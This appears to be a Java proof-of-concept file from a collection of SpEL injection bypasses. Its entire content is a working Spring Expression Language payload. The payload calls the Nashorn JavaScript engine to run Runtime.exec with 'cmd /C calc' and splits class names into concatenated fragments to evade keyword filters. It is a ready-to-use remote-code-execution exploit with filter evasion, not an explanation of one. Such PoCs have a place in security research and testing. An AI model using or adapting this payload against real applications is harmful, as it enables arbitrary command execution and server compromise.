package PoCAndBypass.failedBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

// JavaScript 引擎通用 PoC (JavaScript Engine Bypass)
public class JavaScriptEngineBypass {
    public static void main(String[] args) {
        String spel = "T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\")" +
                ".eval(\"s=[3];s[0]='cmd';" +
                "s[1]='/C';s[2]='calc';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\")";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
